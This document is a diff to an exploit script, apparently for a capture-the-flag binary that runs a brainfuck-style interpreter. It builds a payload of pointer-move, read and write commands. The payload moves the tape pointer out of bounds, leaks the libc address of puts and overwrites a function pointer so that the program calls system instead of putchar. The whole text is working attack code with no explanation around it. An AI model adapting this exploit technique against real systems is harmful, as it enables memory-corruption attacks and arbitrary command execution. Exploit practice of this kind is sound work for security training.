@@ -54,11 +54,14 @@ jmp_back_to_code_start = 0x8048470
 jmp_back_to_code_start = 0x8048470
 print(f"sh_addr: {str(sh_addr)}")
 good_jump_addr = 0x0804857d
-payload = padding + p32(0xdeadbeef) +  p32(good_jump_addr)
-payload += b"<" * 136 #move back 136 bytes -,.\nAB\n".encode() # --> should work
-payload += b".>.>.>." # leak the address of libc
-payload += b"<<<" # leak the address of libc
-payload += b",>,>,>," # putchar - for sending the last char
+#payload = padding + p32(0xdeadbeef) +  p32(good_jump_addr)
+payload = b"<" * 136 #move back 136 bytes -,.\nAB\n".encode() # --> should work
+payload += b".>.>.>." # leak the address of puts
+payload += b"<<<" # leak the address of puts
+payload += b">" * 24 #move back 136 bytes -,.\nAB\n".encode() # --> should work
+payload += b",>,>,>," # getchar - for getting the last char
+payload += b"." # trigger char
+payload += b"AAAABBBB" # payload
 payload += b"[" # call to puts()
 payload += b"\n" # call to puts()
 conn.send(payload)
@@ -101,7 +104,7 @@ heap_arbitrary_addr = 0x804b0a7
 heap_rop_nop = libc_addr + 0x0000c30c
 print(f"heap nop rop : {hex(heap_rop_nop)}")
 #payload =my_rop
-payload = p32(putchar_addr)
+payload = p32(system_addr)
 heap_rop_push_edx = libc_addr + 0x0013cfd8
 payload += p32(system_addr)
 conn.sendline(payload)
